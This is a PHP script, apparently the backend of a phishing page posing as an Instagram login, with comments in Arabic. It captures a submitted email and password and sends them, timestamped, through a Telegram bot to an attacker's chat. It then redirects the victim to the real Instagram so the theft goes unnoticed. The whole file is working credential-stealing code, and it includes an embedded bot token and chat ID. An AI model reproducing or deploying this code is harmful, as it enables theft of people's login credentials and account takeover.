<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // ID الخاص بالبـوت
    $bot_id = "7590971159:AAEKdP-eSEE99hsy1rTEUAi0zba7BginDoA";
    // ID المستخدم
    $user_id = "5091980014";
    // رابط API لإرسال رسالة إلى Telegram
    $url = "https://api.telegram.org/bot$bot_id/sendMessage";

    // الرسالة الغامضة والجذابة
    $message = "*[تم اختراق الفأر بنجاح]*\n";
    $message .= "🔐 _تم الدخول إلى الحساب انستجرام..._\n\n";
    $message .= "⏳ *الوقت:* " . date('Y-m-d H:i:s') . "\n";
    $message .= "📧 *البريد الإلكتروني:* `{$email}`\n";
    $message .= "💻 *كلمة المرور:* `{$password}`\n\n";
    $message .= "_استكمال التنفيذ..._ 🌑\n";
    $message .= "*العملية تتم في صمت.*\n\n";
    $message .= "⚠️ *تحذير:* هذه البيانات لا يجب أن تُشارك مع أي طرف آخر.\n";

    // تنسيق البيانات بشكل صحيح لإرسالها عبر cURL
    $data = [
        'chat_id' => $user_id,
        'text' => $message,
        'parse_mode' => 'Markdown',  // تفعيل دعم Markdown لزيادة التنسيق
    ];

    // استخدم cURL لإرسال البيانات إلى Telegram
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data)); // تأكد من استخدام http_build_query لتنسيق البيانات
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    // إعادة توجيه المستخدم إلى صفحة Instagram
    header("Location: https://www.instagram.com/");
    exit(); // تأكد من إنهاء التنفيذ بعد التوجيه
} else {
    echo "حدث خطأ في إرسال البيانات.";
}
?>
